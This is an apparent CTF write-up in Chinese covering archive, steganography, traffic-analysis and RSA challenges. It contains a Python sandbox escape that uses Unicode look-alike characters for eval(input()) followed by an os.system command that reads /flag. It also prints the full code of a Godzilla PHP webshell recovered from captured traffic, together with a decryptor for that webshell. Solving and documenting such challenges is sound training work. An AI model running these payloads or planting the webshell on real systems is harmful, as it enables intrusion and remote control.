![1729906689754](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729906689754.png)

有点东西，看看分出来了什么。

![1729906799737](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729906799737.png)

发现是个套娃，一共有500层。之前遇到过这种题目，用脚本尝试循环解压即可

```python
import zipfile
import os


def unzip_multiple_times(zip_file_path, output_dir, times=500):
    current_zip = zip_file_path

    for i in range(times):
        with zipfile.ZipFile(current_zip, 'r') as zip_ref:
            zip_ref.extractall(output_dir)
            # 生成下一个 ZIP 文件的路径
            extracted_files = zip_ref.namelist()
            # 假设解压后只取第一个文件继续解压
            current_zip = os.path.join(output_dir, extracted_files[0])
            print(f"解压第 {i + 1} 次: {current_zip}")

    print("解压完成！")


# 示例用法
zip_file_path = "E:\\python3\\Scripts\\_ZPZ.jpg.extracted\\2340.zip" # 请替换为你的 ZIP 文件路径
output_dir = 'E:\\python3\\Scripts\\_ZPZ.jpg.extracted'  # 请替换为解压后的文件输出目录
unzip_multiple_times(zip_file_path, output_dir)

```

解压完成，得到最后一个压缩包，

![1729906997836](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729906997836.png)

点开居然要密码？？？
![1729907094101](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729907094101.png)

猜测是伪加密，因为题目没给什么信息，用winrar修复一下看看。

修复完的包打开即可直接查看：
![1729907243799](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729907243799.png)

### 什么？来玩玩心算吧|解题人：yatq

nc连接环境：
![1729907452101](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729907452101.png)

乱码了。。
cmd编码的问题，输入chcp65001就好了。
![1729907582491](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729907582491.png)

让我们玩二十四点，当然不行了，我们可是来拿flag的呀，看看怎么能命令执行先。
尝试输入eval(input()),看来不行。。
![1729907713528](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729907713528.png)

试试unicode相似字符呢？
𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵()) 

![1729908206454](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729908206454.png)

成功了！
直接一把梭：
__import__('os').system('cat /flag')

![1729908444263](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729908444263.png)

获得flag.

### 如果再来一次，还会选择我吗？|解题人：yatq

附件是一张图片和一个加密压缩包，应该是要解密图片获得解压缩密码

![1729908753037](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729908753037.png)

打开照片发现损坏了：

![1729908873218](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729908873218.png)

放在010Editor里面看贴一下怎么回事：
![1729908934062](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729908934062.png)细看了一下，发现并不是整体颠倒了而是每两个16进制数调换了位置，用脚本修复一下：

```python
def swap_bytes(input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    swapped_data = bytearray()
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            swapped_data.append(data[i + 1])
            swapped_data.append(data[i])
        else:
            swapped_data.append(data[i])

    with open(output_file, 'wb') as f:
        f.write(swapped_data)


# 示例用法
swap_bytes("D:\\EdgeDownload\\password.png", 'D:\\EdgeDownload\\output.png')
```

![output](D:\EdgeDownload\2\output.png)

得到坤坤告诉我们密码，输入进入第二层：
有一个flag.zip和被破坏的条形码：
![key](D:\EdgeDownload\2\1\key.png)

尝试用PS修复一下：
![key](C:\Users\Lenovo\Desktop\BuildCTF\key.png)

终于能扫出来了！！（PS小白累死我了！！）
![1729909622456](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729909622456.png)

密码打开压缩包查看flag.txt

![1729909930654](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729909930654.png)

捏麻麻地，这啥？？
看到后面有两个等号，应该是base64,但是解密之后还是啥也不是，怎么办？？
![1729910063228](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729910063228.png)

看解出来还有=，莫非是重复加密？？发现越来越短了，
试试，最终解密十几层后。。。：

![1729910251352](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729910251352.png) 

（折磨人）

### LSB|解题人：yatq

题目提示很明显，LSB隐写：
进stegsolve看看：

![1729910631476](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729910631476.png)

有base64,解密看看：
![1729910736567](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729910736567.png)

得到flag。

### 有黑客！！！|解题人：yatq

题目附件是一个流量包，用wireshark打开：
试试筛选POST请求看看：
发现一个可疑的流量包：

![1729911515925](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729911515925.png)

看起来是个木马。在往下看看好几个相同的包：

![1729911661205](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729911661205.png)

看着有一层url编码，先解码看看：
![1729911738908](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729911738908.png)

第一个参数是个php代码命令放进环境执行以下：

![1729911973523](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729911973523.png)

有一段奇怪的代码：
贴一下：

```php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='hhhhacker';
$payloadName='payload';
$key='73b761208d5c05f2';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
                eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

查资料发现，这是哥斯拉的木马，有一个解密文脚本：

```php
<?php
function encode($D,$K){
	for($i=0;$i<strlen($D);$i++){
		$c = $K[$i+1&15];
		$D[$i] = $D[$i]^$c;
	}
	return $D;
}
 
$pass='hhhhacker';
$payloadName='payload';
$key='73b761208d5c05f2';
echo gzdecode(encode(base64_decode('
解密内容'),$key));
?>
```

 了解到：（对于`PHP_XOR_BASE64`加密方式来说，前后各附加了16位的混淆字符），所以我们拿到的流量要先删除前16位和后16位字符 **（脚本中的已经去掉了）**

用这种方式把POST请求包里面的密文逐个解密，最终在一个一个包里面找到了flag.

![1fa7dca5cddb2d6a94ddbc352212c40](D:\WeChat Files\wxid_f30o1ybzarmf22\FileStorage\Temp\1fa7dca5cddb2d6a94ddbc352212c40.png)

## crypto

### OVO开门爽！开到南天门了兄弟|解题人：yatq

了解了RSA加密的基础，

GPT秒了（

```python
from Crypto.Util.number import long_to_bytes
import math

# 已知的值
c = 27915082942179758159664000908789091022294710566838766903802097394437507062054409033932303966820096232375646873480427485844733381298467171069985418237873120984132166343258345389477844339261488318588760125230979340678006871754125487279212120945061845738130108370814509280317816067243605608952074687396728904772649873860508240809541545939219624254878900291126739390967820141036260712208555574522131446556595562330969209665291757386246648060990840787769772160549862538116370905306402293764494501838709895355570646716245976733542014165663539815972755562821443411642647981898636761822107221203966296758350547477576411216744594534002057673625678188824476543288048956124565509473100550838563085585434675727358831610724920550213350035792170323729397796947598697983084347567191009236345815968927729025919066227704728180060805553787151862426034275526605154807840695498644070184681962311639338273469859838505348823417234722270798882384367058630064108155240680307754557472476430983184039474907188578578484589833812196216551783354411797156409948499012005963943728564803898150155735762695825658678475746559900705796814512838380193603178657226033406812810314960142251012223576984115642351463684724512456778548853002653596485899854303126091917273560

# 从给定的输出中提取 p 和 q 的平方
p_squared = 8279853330757234669136483032750824826175777927506575083710166412897012079466955769715275604152872242147320194640165649152928984919315754419447729793483984130396358578571137956571302516202649076619076831997922675572705848199504309232044502957866317011212505985284129365522570368395368427388904223782742850616983130885152785650513046301920305069822348366931825404271695876688539675285303882189060671184911139742554710018755565518014777733322795522710234091353878298486498244829638878949389690384488573338138825642381687749888102341379254137445546306796258092762099409409285871651688611387507673794784257901946892698481
q_squared = 9406643503176766688113904226702477322706664731714272632525763533395380298320140341860043591350428258361089106233876240175767826293976534568274153276542755524620138714767338820334748140365080856474253334033236457092764244994983837914955286808153784628739327217539701134939748313123071347697827279169952810727995681780717719971161661561936180553161888359929479143712061627854343656949334882218260141557768868222151468471946884225370009706900640851492798538458384449294042930831359723799893581568677433868531699360789800449077751798535497117004059734670912829358793175346866262442550715622833013235677926312075950550681

# 计算 p 和 q
p = int(math.isqrt(p_squared))
q = int(math.isqrt(q_squared))

# 计算 n 和 φ(n)
n = p * q
phi_n = (p - 1) * (q - 1)

# 计算 d
e = 65537
d = pow(e, -1, phi_n)

# 解密密文 c
m = pow(c, d, n)

# 将 m 转换为字节形式
flag = long_to_bytes(m)
print("Flag:", flag.decode())
from Crypto.Util.number import long_to_bytes
import math

# 已知的值
c = 27915082942179758159664000908789091022294710566838766903802097394437507062054409033932303966820096232375646873480427485844733381298467171069985418237873120984132166343258345389477844339261488318588760125230979340678006871754125487279212120945061845738130108370814509280317816067243605608952074687396728904772649873860508240809541545939219624254878900291126739390967820141036260712208555574522131446556595562330969209665291757386246648060990840787769772160549862538116370905306402293764494501838709895355570646716245976733542014165663539815972755562821443411642647981898636761822107221203966296758350547477576411216744594534002057673625678188824476543288048956124565509473100550838563085585434675727358831610724920550213350035792170323729397796947598697983084347567191009236345815968927729025919066227704728180060805553787151862426034275526605154807840695498644070184681962311639338273469859838505348823417234722270798882384367058630064108155240680307754557472476430983184039474907188578578484589833812196216551783354411797156409948499012005963943728564803898150155735762695825658678475746559900705796814512838380193603178657226033406812810314960142251012223576984115642351463684724512456778548853002653596485899854303126091917273560

# 从给定的输出中提取 p 和 q 的平方
p_squared = 8279853330757234669136483032750824826175777927506575083710166412897012079466955769715275604152872242147320194640165649152928984919315754419447729793483984130396358578571137956571302516202649076619076831997922675572705848199504309232044502957866317011212505985284129365522570368395368427388904223782742850616983130885152785650513046301920305069822348366931825404271695876688539675285303882189060671184911139742554710018755565518014777733322795522710234091353878298486498244829638878949389690384488573338138825642381687749888102341379254137445546306796258092762099409409285871651688611387507673794784257901946892698481
q_squared = 9406643503176766688113904226702477322706664731714272632525763533395380298320140341860043591350428258361089106233876240175767826293976534568274153276542755524620138714767338820334748140365080856474253334033236457092764244994983837914955286808153784628739327217539701134939748313123071347697827279169952810727995681780717719971161661561936180553161888359929479143712061627854343656949334882218260141557768868222151468471946884225370009706900640851492798538458384449294042930831359723799893581568677433868531699360789800449077751798535497117004059734670912829358793175346866262442550715622833013235677926312075950550681

# 计算 p 和 q
p = int(math.isqrt(p_squared))
q = int(math.isqrt(q_squared))

# 计算 n 和 φ(n)
n = p * q
phi_n = (p - 1) * (q - 1)

# 计算 d
e = 65537
d = pow(e, -1, phi_n)

# 解密密文 c
m = pow(c, d, n)

# 将 m 转换为字节形式
flag = long_to_bytes(m)
print("Flag:", flag.decode())

```

运行得到flag:

![1729913622445](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729913622445.png)

### Ju5t_d3c0de_1t!|解题人：yatq

```txt
e = 'VTJGc2RHVmtYMThUWGplSkN2YzJwazJ2KzJieQ=='
c = 10110011010010110101101101011110100001010100101110111011101101111101101001000010111010010011101111001111111000000001111000000010101
p = 1100010000110101100011011010101011111101001101010011001010110111100011110110101111000101100001011011001100110010010111111100110000001111010111111101111001100111100011100110110011101011111011100111010011000100011001101101111011010110000011011100101010010101110001011011010111001010101101100101011111101000110010111000011010111001101001
q = 11000010010010011110101110100011011100101101100100011011100010111000011110111000000011111100010100100000101101010101000101101101101011011100001101111010001010010011001010110010110101001100100011010110100011110011101110101110111110100000011110101010011011111010111100011000011111001000010101100100011110010000010001110010101100100111001
key = 592924741013363689040199750462798275514934297277010275281372369969899775117892551575873706970423924419480394766364097497072075403342004187895966953143489192628648965081601335846012859223829286606349019
# use m minus key to get the final flag!
```

看来和编码解码有关，c.p,q二进制转为十进制，e应该是base64,但是解码后看不懂：
![1729916298495](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729916298495.png)

试试65537？这是常见值，蒙一蒙，

```python
from Crypto.Util.number import *
import base64
import sympy
e = 'VTJGc2RHVmtYMThUWGplSkN2YzJwazJ2KzJieQ=='
c = 10110011010010110101101101011110100001010100101110111011101101111101101001000010111010010011101111001111111000000001111000000010101
p = 1100010000110101100011011010101011111101001101010011001010110111100011110110101111000101100001011011001100110010010111111100110000001111010111111101111001100111100011100110110011101011111011100111010011000100011001101101111011010110000011011100101010010101110001011011010111001010101101100101011111101000110010111000011010111001101001
q = 11000010010010011110101110100011011100101101100100011011100010111000011110111000000011111100010100100000101101010101000101101101101011011100001101111010001010010011001010110010110101001100100011010110100011110011101110101110111110100000011110101010011011111010111100011000011111001000010101100100011110010000010001110010101100100111001
key = 592924741013363689040199750462798275514934297277010275281372369969899775117892551575873706970423924419480394766364097497072075403342004187895966953143489192628648965081601335846012859223829286606349019
# use m minus key to get the final flag!


e_decoded = 65537  # 常见的 RSA 公钥指数

# 转换 c, p, q 为整数
c = int(str(c), 2)
p = int(str(p), 2)
q = int(str(q), 2)

# 计算 n
n = p * q

# 求出 d (使用 e 的反演)
phi = (p - 1) * (q - 1)
d = inverse(e_decoded, phi)

# 解密 m
m = pow(c, d, n)

# 计算最终 flag
key = 592924741013363689040199750462798275514934297277010275281372369969899775117892551575873706970423924419480394766364097497072075403342004187895966953143489192628648965081601335846012859223829286606349019
flag = m - key

# 输出 flag
print(long_to_bytes(flag))
```

结果出了：
b'I_l1k3_crypt0_5o_h4rd!'

套壳提交即可。
赛后问了学长，才知道那一串是rubbits加密。

![1729916596612](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\1729916596612.png)

